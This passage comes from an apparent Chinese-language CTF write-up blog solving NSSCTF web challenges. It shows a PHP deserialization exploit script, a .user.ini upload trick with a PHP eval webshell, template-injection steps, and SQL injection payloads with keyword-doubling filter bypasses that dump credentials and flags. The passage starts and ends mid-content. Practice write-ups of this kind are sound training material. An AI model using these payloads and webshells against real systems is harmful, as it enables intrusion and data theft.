&#x27;a9706a25a3a9e77e7109334a7e6c563030e8774c67e60bf414fc19beefceed71e7df1caf8b79fd</span><br><span class="line">4330b70a230800b1ddd14a12e19f0af076dffc099ba9941b5e&#x27;, &#x27;_user_id&#x27;: &#x27;1&#x27;&#125;&quot;</span><br><span class="line"></span><br><span class="line">.eJwlzjEOwzAIAMC_MHeAYJuQz0RgQO2aNFPVvzdS15vuA3sdeT5hex9XPmB_BWxgKjhs6camKZJCqMzNJMfsg5ExV5E2xw3o1ajVJPXMmpkhlBJF02p10YrGjC5oC-OK6BQR1IyWJC20QhlRNVHVTbWR94Q7cp15_DcE3x_Ovy_z.aOiklg.8mo1XmLqTIj-6RuRxvgu7__4Y-g</span><br></pre></td></tr></table></figure><img src="5e432dcdae883b55ace167cf0a4183b7.png" alt="5e432dcdae883b55ace167cf0a4183b7.png" /><img src="e7ebc9cb9ac2e7adfe317a16803a861d.png" alt="e7ebc9cb9ac2e7adfe317a16803a861d.png" /><img src="ab72b2d9bf4d126f3f38646240947868.png" alt="ab72b2d9bf4d126f3f38646240947868.png" /><h2 id="21-ez-SSTI"><a href="#21-ez-SSTI" class="headerlink" title="21.ez_SSTI"></a>21.ez_SSTI</h2><p>在kali安裝fenjing :</p><p>pip install fenjing -i <a href="https://pypi.tuna.tsinghua.edu.cn/simple">https://pypi.tuna.tsinghua.edu.cn/simple</a></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fenjing webui</span><br></pre></td></tr></table></figure><img src="96f12fb4d30448b04b349f1049b740c3.png" alt="96f12fb4d30448b04b349f1049b740c3.png" /><p>輸入參數開始爆破</p><h2 id="22-easy-unser"><a href="#22-easy-unser" class="headerlink" title="22.easy_unser"></a>22.easy_unser</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="keyword">include</span> <span class="string">&#x27;f14g.php&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">body</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$want</span>,<span class="variable">$todonothing</span> = <span class="string">&quot;i can&#x27;t get you want,But you can tell me before I wake up and change my mind&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__construct</span>(<span class="params"><span class="variable">$want</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$About_me</span> = <span class="string">&quot;When the object is created,I will be called&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$want</span> !== <span class="string">&quot; &quot;</span>) <span class="variable language_">$this</span>-&gt;want = <span class="variable">$want</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="variable language_">$this</span>-&gt;want = <span class="variable language_">$this</span>-&gt;todonothing;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$About_me</span> = <span class="string">&quot;When the object is unserialized,I will be called&quot;</span>;</span><br><span class="line">        <span class="variable">$but</span> = <span class="string">&quot;I can CHANGE you&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt; want = <span class="variable">$but</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;C1ybaby!&quot;</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$About_me</span> = <span class="string">&quot;I&#x27;m the final function,when the object is destroyed,I will be called&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;So,let me see if you can get what you want\n&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;todonothing === <span class="variable language_">$this</span>-&gt;want)</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;鲍勃,别傻愣着!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;want == <span class="string">&quot;I can CHANGE you&quot;</span>)</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;You are not you....&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;want == <span class="string">&quot;f14g.php&quot;</span> OR <span class="title function_ invoke__">is_file</span>(<span class="variable">$this</span>-&gt;want))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;You want my heart?No way!\n&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You got it!&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;want);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">unserializeorder</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$CORE</span> = <span class="string">&quot;人类最大的敌人,就是无序. Yahi param vaastavikta hai!&lt;BR&gt;&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$About_me</span> = <span class="string">&quot;When the object is serialized,I will be called&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;We Come To HNCTF,Enjoy the ser14l1zti0n &lt;BR&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$About_me</span> = <span class="string">&quot;When the object is used as a string,I will be called&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;CORE;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title function_ invoke__">unserializeorder</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="variable">$obj</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>);</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ywant&#x27;</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$ywant</span> = @<span class="title function_ invoke__">unserialize</span>(@<span class="variable">$_GET</span>[<span class="string">&#x27;ywant&#x27;</span>]);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$ywant</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">人类最大的敌人,就是无序. Yahi param vaastavikta hai!</span><br><span class="line">We Come To HNCTF,Enjoy the ser14l1zti0n</span><br></pre></td></tr></table></figure><h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p> 是将 PHP 对象转换为字符串的过程，可以使用 serialize() 函数来实现。该函数将对象的状态以及它的类名和属性值编码为一个字符串。序列化后的字符串可以存储在文件中，存储在数据库中，或者通过网络传输到其他地方。</p><p><a href="https://">https://www.bilibili.com/video/BV1GN4y1c7ut/?spm_id_from&#x3D;333.337.search-card.all.click&amp;vd_source&#x3D;b128d59725d91ecef706ce0b01795a8f</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">body</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$want</span>,<span class="variable">$todonothing</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__construct</span>(<span class="params"><span class="variable">$want</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$About_me</span> = <span class="string">&quot;When the object is created,I will be called&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$want</span> !== <span class="string">&quot; &quot;</span>) <span class="variable language_">$this</span>-&gt;want = <span class="variable">$want</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="variable language_">$this</span>-&gt;want = <span class="variable language_">$this</span>-&gt;todonothing;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$f</span> = <span class="string">&quot;php://filter/convert.base64-encode/resource=f14g.php&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">body</span>(<span class="variable">$f</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/:2:&#123;/&quot;</span>,<span class="string">&quot;:3:&#123;&quot;</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$c</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><img src="901aacec5c9e8f412935b1b1d82ee2df.png" alt="901aacec5c9e8f412935b1b1d82ee2df.png" /><img src="ddf40e1c15fcf00cddda177797c0b080.png" alt="ddf40e1c15fcf00cddda177797c0b080.png" /><h2 id="23-看看ip"><a href="#23-看看ip" class="headerlink" title="23.看看ip"></a>23.看看ip</h2><img src="e78ab70aec28838ebc8bb91f50c10425.png" alt="e78ab70aec28838ebc8bb91f50c10425.png" /><p>IP是线索</p><p>加一個X-Forwarded-For </p><p>是&#123;&#123;&#125;&#125; 模板注入</p><img src="07c07948454ee7ffc48f71d2eef2732d.png" alt="07c07948454ee7ffc48f71d2eef2732d.png" /><img src="73975aaedff0f314a228b66e81360da9.png" alt="73975aaedff0f314a228b66e81360da9.png" /><img src="02fe2b5fd3b0159f32acd93815881dfa.png" alt="02fe2b5fd3b0159f32acd93815881dfa.png" /><h2 id="24-怎么多了个没用的php文件"><a href="#24-怎么多了个没用的php文件" class="headerlink" title="24.怎么多了个没用的php文件"></a>24.怎么多了个没用的php文件</h2><img src="e715b46d3754d888ea7138fafc0bafe2.png" alt="e715b46d3754d888ea7138fafc0bafe2.png" /><img src="69a1a0687d44b0021a45a50f3ac70355.png" alt="69a1a0687d44b0021a45a50f3ac70355.png" /><p>可以看見在uploads文件夾下有, 個notion.php</p><img src="17919fb51068948349cf90f788b55f77.png" alt="17919fb51068948349cf90f788b55f77.png" /><p>蚁剑 fuzz</p><p>服务器是 nginx ，所以无法使用 htaccess(超文件)</p><img src="a8ae227886464f5d88225ca1e48e38b8.png" alt="a8ae227886464f5d88225ca1e48e38b8.png" /><h3 id="Apache-的-htaccess-机制"><a href="#Apache-的-htaccess-机制" class="headerlink" title="Apache 的 .htaccess 机制"></a>Apache 的 .htaccess 机制</h3><ul><li>分布式配置：Apache 被设计为允许在每个目录下放置一个 .htaccess 文件。</li><li>运行时读取：当收到一个请求时，Apache 会从网站根目录开始，一路向上查找并解析每一级目录下的 .htaccess 文件，然后实时应用其中的规则。</li><li>优点：方便共享主机用户在不接触主配置文件的情况下修改配置。</li><li>缺点：性能有开销，因为每个请求都可能要读取多个文件。</li></ul><h3 id="Nginx-的配置"><a href="#Nginx-的配置" class="headerlink" title="Nginx 的配置"></a>Nginx 的配置</h3><ul><li>集中式配置：Nginx 没有类似 .htaccess 的机制。它的所有配置都集中在一个主配置文件（通常是 nginx.conf）以及通过 include 指令引入的其他配置文件中。</li><li>启动时加载：Nginx 在启动或重载时，会一次性读取并编译所有配置，形成一个高效的配置树。</li><li>优点：性能极高，因为处理请求时不需要再去文件系统里查找和解析额外的配置文件。</li><li>缺点：用户必须能访问服务器配置文件，或者在 server 块内拥有写入权限（例如通过控制面板）</li></ul><p>寫一下: auto_prepend_file &#x3D; 1.png</p><p>改成.user.ini文件</p><p>用BP抓包 , 上傳ini文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.user.ini</span><br><span class="line">auto_prepend_file=xxx 表示在文件頭包含</span><br><span class="line">auto_append_file=xxx 表示在文件尾包含</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">auto_prepend_file=1.jpg</span><br></pre></td></tr></table></figure><p>.user.ini文件是一種日志包含 , 然後在訪問的時候ua加上一句話, 再上傳一個php文件來進行一個包含。</p><img src="b9623524e79975298235b69e9ddb8e97.png" alt="b9623524e79975298235b69e9ddb8e97.png" /><p>再上傳一句話木馬 1.jpg</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;123&quot;</span>]);</span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以知道notion.php包含了上面的代碼, 用notion.php連線:</p><img src="64a4dbb9c2cc139206a9233aaa925ead.png" alt="64a4dbb9c2cc139206a9233aaa925ead.png" /><img src="a770e99ebcab1e349cb7e231a2b5f1e3.png" alt="a770e99ebcab1e349cb7e231a2b5f1e3.png" /><img src="8cc9167e7d7a68e18fa21af218e726e7.png" alt="8cc9167e7d7a68e18fa21af218e726e7.png" /><br/><img src="55e24b74ad632bb9d989ef7a1bc54d4e.png" alt="55e24b74ad632bb9d989ef7a1bc54d4e.png" /><p>NSSCTF{213a5655-425e-4ac9-b0bd-32f9e6ea9af4}</p><h2 id="25-UploadBaby"><a href="#25-UploadBaby" class="headerlink" title="25.UploadBaby"></a>25.UploadBaby</h2><p>可恶的前端，不让我传word 马，把你扬了就老实了</p><img src="79d8ae6d5190ad9b97e4ac828c647c0b.png" alt="79d8ae6d5190ad9b97e4ac828c647c0b.png" /><img src="176c7a599d2243f544194ea825785c48.png" alt="176c7a599d2243f544194ea825785c48.png" /><p><a href="http://node6.anna.nssctf.cn:29933/uploads/1.php">http://node6.anna.nssctf.cn:29933/uploads/1.php</a></p><img src="038c210cb9ebb9c7215a35440029c686.png" alt="038c210cb9ebb9c7215a35440029c686.png" /><img src="b65a95273debd8677d7b34f1e4a9f167.png" alt="b65a95273debd8677d7b34f1e4a9f167.png" /><h2 id="26-ez-sql"><a href="#26-ez-sql" class="headerlink" title="26.ez_sql"></a>26.ez_sql</h2><img src="22c4a7ca350c2e376f7fa15a302be6ae.png" alt="22c4a7ca350c2e376f7fa15a302be6ae.png" /><p>相对安全的方式传参?????</p><img src="bf8307cd110d03d41a1c9d56e01f6146.png" alt="bf8307cd110d03d41a1c9d56e01f6146.png" /><img src="a2baabd2b65aa66654c5b9844891b59c.png" alt="a2baabd2b65aa66654c5b9844891b59c.png" /><img src="ea2230b1eec711aa501065f0294f173d.png" alt="ea2230b1eec711aa501065f0294f173d.png" /><p>判断列数先</p><p>双写命令绕过:<br><img src="f714aaf2dcedaab4bfdb6915775046b1.png" alt="f714aaf2dcedaab4bfdb6915775046b1.png" /></p><p>列数为3</p><p>判断显示位</p><img src="66831d116f87b5c4f1165d2d51722e4e.png" alt="66831d116f87b5c4f1165d2d51722e4e.png" /><p>尝试查看第二行</p><img src="de806c50d12a11da6d7fc221662342ca.png" alt="de806c50d12a11da6d7fc221662342ca.png" /><p>查询数据库名</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;/**/ununionion/**/select/**/1,database(),(select/**/group_concat(schema_name)/**/from/**/infoorrmation_schema.schemata)/**/limit/**/1,1#</span><br></pre></td></tr></table></figure><img src="e12f0d6df8aa9cf805081a86bde10b4b.png" alt="e12f0d6df8aa9cf805081a86bde10b4b.png" /><p>查询表名</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;/**/ununionion/**/select/**/1,database(),group_concat(table_name)/**/from/**/infoorrmation_schema.tables/**/where/**/table_schema=database()/**/limit/**/1,1#</span><br></pre></td></tr></table></figure><img src="28bc8935b945fdd395b45c46fb511689.png" alt="28bc8935b945fdd395b45c46fb511689.png" /><p>查询表内字段名</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;/**/ununionion/**/select/**/1,database(),group_concat(column_name)/**/from/**/infoorrmation_schema.columns/**/where/**/table_name=&#x27;NSS_tb&#x27;/**/limit/**/1,1#</span><br></pre></td></tr></table></figure><img src="fda0853ed31d9dc989a0db1275038c06.png" alt="fda0853ed31d9dc989a0db1275038c06.png" /><p>查询字段内容</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;/**/ununionion/**/select/**/1,database(),group_concat(id,Secr3t,flll444g)/**/from/**/NSS_tb/**/limit/**/1,1#</span><br></pre></td></tr></table></figure><img src="5c1ff72d0d1a5408606592c551d1a663.png" alt="5c1ff72d0d1a5408606592c551d1a663.png" /><h2 id="27-这是什么？SQL-！注一下-！"><a href="#27-这是什么？SQL-！注一下-！" class="headerlink" title="27.这是什么？SQL ！注一下 ！"></a>27.这是什么？SQL ！注一下 ！</h2><img src="ea14253c98c1786d496d367c75cd16f4.png" alt="ea14253c98c1786d496d367c75cd16f4.png" /><p>可以看見sql代碼</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT username,password FROM users WHERE id = &quot;</span>.<span class="string">&#x27;((((((&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>].<span class="string">&#x27;))))))&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure><p>輸入一個1可以看到 </p><img src="99609d6114112c4c69c7f32084313877.png" alt="99609d6114112c4c69c7f32084313877.png" /><p>推断是两个字段 :</p><p>username &#x3D; tanji       password &#x3D; OHHHHHHH</p><p>select 一下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>)))))) <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> <span class="comment">-- </span></span><br></pre></td></tr></table></figure><img src="2b713b584e3eb2d5439ed2511444aa0e.png" alt="2b713b584e3eb2d5439ed2511444aa0e.png" /><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>)))))) <span class="keyword">union</span> <span class="keyword">select</span> database(),<span class="number">2</span> <span class="comment">-- </span></span><br></pre></td></tr></table></figure><img src="1bbda58f59d944576882ba282830fa45.png" alt="1bbda58f59d944576882ba282830fa45.png" /><p>所有数据库名：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>)))))) <span class="keyword">union</span> <span class="keyword">select</span> group_concat(schema_name),<span class="number">2</span> <span class="keyword">from</span> information_schema.schemata <span class="comment">-- </span></span><br></pre></td></tr></table></figure><img src="a8b299b36cfae6217bddbd68cc1dc711.png" alt="a8b299b36cfae6217bddbd68cc1dc711.png" /><p>ctf的表名：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>)))))) <span class="keyword">union</span> <span class="keyword">select</span> group_concat(table_name),<span class="number">2</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;ctf&#x27;</span> <span class="comment">--</span></span><br></pre></td></tr></table></figure><img src="3abceb620f2d24e7d68dc4cca18c16f6.png" alt="3abceb620f2d24e7d68dc4cca18c16f6.png" /><p>查users表中的字段名:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>)))))) <span class="keyword">union</span> <span class="keyword">select</span> group_concat(column_name),<span class="number">2</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;ctf&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> #</span><br></pre></td></tr></table></figure><img src="d6512debb874046d84a88bfcce76a388.png" alt="d6512debb874046d84a88bfcce76a388.png" /><p>查users表中数据：</p><p>0x7e &#x3D; ~ (波浪號)十六進制編碼</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>)))))) <span class="keyword">union</span> <span class="keyword">select</span> group_concat(id,<span class="number">0x7e</span>,username,<span class="number">0x7e</span>,password),<span class="number">2</span> <span class="keyword">from</span> users # </span><br></pre></td></tr></table></figure><img src="3b85731201687b978cf3059081b2057d.png" alt="3b85731201687b978cf3059081b2057d.png" /><p>再看其他数据库，还有一个ctftraining数据库:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>)))))) <span class="keyword">union</span> <span class="keyword">select</span> group_concat(table_name),<span class="number">2</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;ctftraining&#x27;</span> #</span><br></pre></td></tr></table></figure><img src="e7f4930394bb7c639d7fd61d9c7c7218.png" alt="e7f4930394bb7c639d7fd61d9c7c7218.png" /><p>先查flag表的字段：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>)))))) <span class="keyword">union</span> <span class="keyword">select</span> group_concat(column_name),<span class="number">2</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;ctftraining&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span>#</span><br></pre></td></tr></table></figure><img src="88becf32643c762cdb4ad11246d44287.png" alt="88becf32643c762cdb4ad11246d44287.png" /><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>)))))) <span class="keyword">union</span> <span class="keyword">select</span> flag,<span class="number">2</span> <span class="keyword">from</span> ctftraining.flag #</span><br></pre></td></tr></table></figure><img src="28257c2a109f722a3b1374fb21ed961a.png" alt="28257c2a109f722a3b1374fb21ed961a.png" /><h2 id="28-理想国"><a href="#28-理想国" class="headerlink" title="28.理想国"></a>28.理想国</h2><p>給了一個json檔:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;swagger&quot;: &quot;2.0&quot;,</span><br><span class="line">    &quot;info&quot;: &#123;</span><br><span class="line">      &quot;description&quot;: &quot;Interface API Documentation&quot;,</span><br><span class="line">      &quot;version&quot;: &quot;1.1&quot;,</span><br><span class="line">      